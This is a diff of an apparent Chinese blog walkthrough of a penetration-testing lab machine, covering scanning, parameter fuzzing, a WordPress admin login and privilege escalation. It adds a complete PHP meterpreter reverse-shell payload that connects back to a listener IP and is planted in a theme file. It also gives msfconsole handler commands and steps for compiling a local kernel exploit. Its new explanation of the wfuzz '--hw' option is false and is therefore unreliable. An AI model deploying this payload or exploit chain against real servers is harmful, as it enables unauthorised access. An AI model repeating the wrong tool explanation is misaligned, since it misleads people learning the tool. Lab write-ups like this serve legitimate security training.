@@ -201,7 +201,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #00bcd4">
+                <a href="/tags/%E7%BD%91%E5%AE%89/" style="color: #03a9f4">
                     网安
                 </a>
             </span>
@@ -217,12 +217,12 @@
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>首先用nmap对本机192.168.23.0网段探测存活主机并获取开放端口。</p>
 <p><img src="%7BB3341A69-D0E1-4DAC-B584-E661CCE4B868%7D.png" alt="{B3341A69-D0E1-4DAC-B584-E661CCE4B868}"></p>
 <p>找到了靶机，开放了两个端口：22和80. 22显然不能正面硬刚，所以从80端口下手。</p>
-<p>用dirb扫描一下。</p>
+<p>现在我们对靶机的目录情况全然不知，用dirb扫描一下，探测一下目录。</p>
 <p><img src="image-20250319171800568.png" alt="image-20250319171800568"></p>
 <p>扫到了一个dev目录。还发现靶机运行着wordpress服务。</p>
 <p>先看dev</p>
 <p><img src="image-20250319171846884.png" alt="image-20250319171846884"></p>
-<p>用dirb继续扫描，这次加上-X扩展扫描。</p>
+<p>用dirb继续扫描，这次加上-X扩展扫描，特定地扫描.txt以及.php格式的文件。</p>
 <p><img src="image-20250319171939510.png" alt="image-20250319171939510"></p>
 <p>扫到了这三个内容，一个一个看。</p>
 <p><img src="image-20250319171947542.png" alt="image-20250319171947542"></p>
@@ -230,6 +230,14 @@
 <p>secret.txt给了一个hint，需要我们fuzz一个php，找到参数把location.txt传进去。</p>
 <pre><code class="bash">wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hw 12 http://192.168.23.156/index.php\?FUZZ
 </code></pre>
+<p>这段命令是使用 wfuzz 工具进行模糊测试（Fuzzing）的示例。wfuzz 是一个基于 Python 的网络模糊测试工具，用于发现 Web 应用程序中的漏洞，如注入漏洞、跨站脚本（XSS）等。下面是对命令的详细解释：</p>
+<ol>
+<li><code>wfuzz</code>：这是调用 wfuzz 工具的命令。</li>
+<li><code>-w /usr/share/wfuzz/wordlist/general/common.txt</code>：这个选项指定了用于模糊测试的单词列表。<code>-w</code> 表示单词列表（wordlist），后面跟着的是单词列表的路径。在这个例子中，使用的是 wfuzz 自带的一个通用单词列表，包含了常见的测试字符串。</li>
+<li><code>--hw 12</code>：这个选项表示设置 HTTP 响应头的最大长度为 12。<code>--hw</code> 是 <code>--hlen</code> 的简写，用于指定 HTTP 响应头的最大长度。如果响应头的长度超过这个值，wfuzz 会认为这个响应是异常的，可能会包含漏洞。</li>
+<li><code>http://192.168.23.156/index.php?FUZZ</code>：这是要测试的目标 URL。<code>FUZZ</code> 是一个占位符，wfuzz 会自动将单词列表中的每个单词替换到这个位置，然后发送请求以测试不同的输入。</li>
+</ol>
+<p>综合起来，这段命令的作用是：使用 wfuzz 工具，通过 <code>/usr/share/wfuzz/wordlist/general/common.txt</code> 这个单词列表，对 <code>http://192.168.23.156/index.php</code> 这个 URL 进行模糊测试，寻找可能存在的漏洞。测试过程中，会检查 HTTP 响应头的长度，如果超过 12，会认为可能存在异常。</p>
 <p><img src="image-20250319172218184.png" alt="image-20250319172218184"></p>
 <p>fuzz出了file这个参数，把location.txt传进去。</p>
 <p><img src="image-20250319172248813.png" alt="image-20250319172248813"></p>
@@ -244,17 +252,22 @@
 <p>这个密码经测试，不是靶机中几个用户的密码。联想到靶机上运行着wordpress服务，猜测是wordpress上管理员账户的密码。</p>
 <p><img src="image-20250319172730587.png" alt="image-20250319172730587"></p>
 <p>只有一个用户，那就是他了。</p>
-<p>我们进入<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-login">http://192.168.23.156/wordpress/wp-login</a> ，用victor作为用户名，前面获取的follow_the_ippsec为密码进行登录，成功登录。</p>
+<p>前面扫到了wp-login。我们进入<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-login">http://192.168.23.156/wordpress/wp-login</a> ，用victor作为用户名，前面获取的follow_the_ippsec为密码进行登录，成功登录。</p>
 <h3 id="渗透提权"><a href="#渗透提权" class="headerlink" title="渗透提权"></a>渗透提权</h3><p>在Appearance下Theme Editor下找到了secret.php这个可修改文件，我们用msfvenom做个马挂上去。</p>
-<p><img src="image-20250319173013451.png" alt="image-20250319173013451"></p>
-<p>secret.php的位置在哪里？前面dirb扫描目录的时候扫描到了“<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-content/themes/">http://192.168.23.156/wordpress/wp-content/themes/</a> ” 这个目录，那就是在这里了。</p>
-<p><a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-content/themes/twentynineteen/secret.php">http://192.168.23.156/wordpress/wp-content/themes/twentynineteen/secret.php</a></p>
+<pre><code class="bash">msfvenom -p php/meterpreter/reverse_tcp 
+</code></pre>
+<pre><code class="php">&lt;?php /**/ error_reporting(0); $ip = &#39;10.2.134.110&#39;; $port = 4444; if (($f = &#39;stream_socket_client&#39;) &amp;&amp; is_callable($f)) &#123; $s = $f(&quot;tcp://&#123;$ip&#125;:&#123;$port&#125;&quot;); $s_type = &#39;stream&#39;; &#125; if (!$s &amp;&amp; ($f = &#39;fsockopen&#39;) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = &#39;stream&#39;; &#125; if (!$s &amp;&amp; ($f = &#39;socket_create&#39;) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = &#39;socket&#39;; &#125; if (!$s_type) &#123; die(&#39;no socket funcs&#39;); &#125; if (!$s) &#123; die(&#39;no socket&#39;); &#125; switch ($s_type) &#123; case &#39;stream&#39;: $len = fread($s, 4); break; case &#39;socket&#39;: $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&#39;len&#39;]; $b = &#39;&#39;; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case &#39;stream&#39;: $b .= fread($s, $len-strlen($b)); break; case &#39;socket&#39;: $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS[&#39;msgsock&#39;] = $s; $GLOBALS[&#39;msgsock_type&#39;] = $s_type; if (extension_loaded(&#39;suhosin&#39;) &amp;&amp; ini_get(&#39;suhosin.executor.disable_eval&#39;)) &#123; $suhosin_bypass=create_function(&#39;&#39;, $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die();
+</code></pre>
+<p>这个马的原理是：在访问php文件时，服务器会执行secret.php中的php代码。这是建立连接的关键，所以需要把控一下顺序：先打开msfconsole进行监听，然后再访问挂马的网页。</p>
+<p>secret.php的位置在哪里？前面dirb扫描目录的时候扫描到了“<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-content/themes/">http://192.168.23.156/wordpress/wp-content/themes/</a> ” 这个目录，那就是在这里了。为什么？</p>
+<p>一般情况下，themes目录存放着wordpress的主题文件，文件夹名一般为主题名。secret.php显然在twentynineteen里，那我们就访问这个目录下的secret.php。</p>
 <p>kali上，msfconsole提前准备好。</p>
 <pre><code class="bash">use exploit/multi/handler
 set LHOST 172.19.15.230
 set payload php/meterpreter/reverse_tcp
 run
 </code></pre>
+<p>然后访问<a target="_blank" rel="noopener" href="http://192.168.23.156/wordpress/wp-content/themes/twentynineteen/secret.php">http://192.168.23.156/wordpress/wp-content/themes/twentynineteen/secret.php</a> </p>
 <p><img src="image-20250319173351806.png" alt="image-20250319173351806"></p>
 <p>成功连接。系统是ubuntu 16.04，我们需要找一个适用的exp。</p>
 <pre><code class="bash">searchsploit 16.04 ubuntu
@@ -265,7 +278,7 @@ find /usr -name 45010.c
 
 /usr/share/exploitdb/exploits/linux/local/45010.c
 </code></pre>
-<p>gcc编译一下，由于环境glibc版本过高，加上-static参数</p>
+<p>gcc编译一下，由于本机环境glibc版本过高，加上-static参数进行静态编译，把所有依赖库全部打包编译进去防止依赖报错。</p>
 <pre><code class="bash">gcc /usr/share/exploitdb/exploits/linux/local/45010.c -o 45010 -static
 </code></pre>
 <p>msfconsole那边，把exp upload上去。</p>
